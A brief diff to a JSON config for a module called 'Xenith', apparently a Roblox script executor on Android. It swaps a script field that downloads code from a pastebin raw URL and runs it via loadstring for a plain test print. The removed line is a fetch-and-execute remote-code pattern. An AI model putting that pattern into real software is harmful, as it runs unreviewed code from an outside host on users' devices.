@@ -1,6 +1,6 @@
 {
   "moduleName": "Xenith",
   "rbxhttp": false,
-  "script": "loadstring(game:HttpGet("https://pastebin.com/raw/P2bPbrLJ"))()",
+  "script": "print("test")",
   "versionName": "Android"
 } 
